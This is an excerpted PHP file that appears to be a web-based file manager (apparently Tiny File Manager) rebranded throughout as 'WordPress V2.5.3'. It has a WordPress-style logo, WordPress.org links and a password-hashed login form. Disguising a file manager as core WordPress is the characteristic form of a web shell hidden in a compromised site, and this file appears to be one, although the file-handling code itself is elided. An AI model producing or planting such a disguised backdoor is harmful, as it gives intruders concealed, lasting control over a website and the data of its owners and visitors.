...
/**
 * wordpress | wordpress versions V2.5.3
...
// Generate secure password hash - https://wordpress.org/docs/pwd.html
$auth_users = array(
    'username' => '$2a$12$C4HbPs5VN4FeEK512uyzV.UvojoByh8JufL.JznFt70qtpyj2779S', //Wwarning
);
...
// sample config - https://wordpress.org/config-sample.txt
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                       <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="WordPress Version WordPress">
                                           <svg width="145pt" height="146pt" viewBox="-1 -1 147 148" xmlns="http://www.w3.org/2000/svg"><g id="fontsvg1741768410885" stroke-linecap="round" fill-rule="evenodd" stroke="#00c6ff" stroke-width="0.5mm" fill="#ffffff"><path d="M 69.592 0 L 76.477 0 Q 92.883 0 113.831 12.891 Q 134.485 27.686 142.249 52.295 A 162.646 162.646 0 0 1 143.338 57.385 Q 144.383 62.71 144.648 66.386 A 32.285 32.285 0 0 1 144.739 68.701 L 144.739 76.465 A 56.869 56.869 0 0 1 140.304 97.936 Q 135.8 109.042 126.721 120.557 A 88.034 88.034 0 0 1 106.138 136.395 A 69.752 69.752 0 0 1 72.229 145.02 A 71.251 71.251 0 0 1 34.291 133.886 A 95.953 95.953 0 0 1 23.157 125.83 A 83.439 83.439 0 0 1 7.335 104.161 A 70.245 70.245 0 0 1 0.012 72.51 Q 0.012 32.08 37.805 8.496 A 111.128 111.128 0 0 1 49.69 3.659 Q 60.556 0 69.592 0 Z M 40.002 51.416 L 40.002 51.855 L 40.442 51.855 A 117.924 117.924 0 0 0 42.841 51.828 Q 46.827 51.746 53.256 51.42 A 662.247 662.247 0 0 0 53.333 51.416 Q 53.333 51.701 54.165 52.68 A 18.502 18.502 0 0 0 54.211 52.734 L 54.211 53.613 Q 54.211 55.078 48.499 55.371 L 62.268 97.412 L 63.147 97.412 Q 63.147 95.27 70.943 73.22 A 1586.005 1586.005 0 0 1 71.35 72.07 A 535.394 535.394 0 0 0 69.993 68.285 Q 65.586 56.146 64.51 55.398 A 0.366 0.366 0 0 0 64.465 55.371 A 27.575 27.575 0 0 1 62.946 55.194 Q 60.754 54.871 60.011 54.283 A 0.854 0.854 0 0 1 59.631 53.613 L 59.631 52.734 A 0.549 0.549 0 0 1 59.763 52.403 Q 60.049 52.03 60.958 51.606 A 11.213 11.213 0 0 1 61.389 51.416 Q 69.153 51.855 71.79 51.855 Q 73.943 51.855 80.007 51.562 A 872.769 872.769 0 0 0 82.922 51.416 A 12.958 12.958 0 0 1 83.243 52.103 Q 83.528 52.
 79.154 111.611 77.06 A 9.092 9.092 0 0 0 111.633 76.465 L 111.633 69.58 A 26.028 26.028 0 0 0 111.03 65.864 Q 110.148 62.039 108.09 57.039 A 97.884 97.884 0 0 0 107.385 55.371 L 106.946 55.371 Z M 54.211 108.691 L 54.944 108.691 L 36.487 58.301 L 36.047 58.301 A 44.509 44.509 0 0 0 33.221 70.917 A 41.238 41.238 0 0 0 33.118 73.828 Q 33.118 96.094 54.211 108.691 Z M 61.829 111.621 A 115.039 115.039 0 0 0 69.393 113.003 A 98.912 98.912 0 0 0 72.229 113.379 Q 84.536 111.84 85.093 110.836 A 0.193 0.193 0 0 0 85.12 110.742 A 3.247 3.247 0 0 0 84.985 110.104 Q 84.039 106.659 76.477 86.279 A 296.14 296.14 0 0 1 75.756 84.478 Q 73.872 79.722 73.495 78.197 A 2.629 2.629 0 0 1 73.401 77.637 A 5.229 5.229 0 0 0 72.699 78.765 Q 71.283 81.59 68.641 90.288 A 382.973 382.973 0 0 0 67.395 94.482 A 296.611 296.611 0 0 0 65.503 99.325 Q 61.923 108.753 61.831 111.481 A 4.136 4.136 0 0 0 61.829 111.621 Z" vector-effect="non-scaling-stroke"/></g></svg>
                                        </div>
                        ...
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="https://wordpress.org/" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">WordPress -</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://wordpress.org/" target="_blank" class="app-v-title"> Version WordPress <?php echo VERSION; ?></a></h3></p>
                    ...
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://wordpress.org//wiki" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="https://wordpress.org//issues" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <?php if(!FM_READONLY) { ?>
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://wordpress.org/" target="_blank" class="float-right text-muted">Version WordPress <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://wordpress.org/" target="_blank" class="float-right text-muted">Version WordPress <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'Version WordPress<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
<head>
    ...
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Version WordPress">
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'Version WordPress';      $tr['en']['AppTitle']           = 'File Manager';
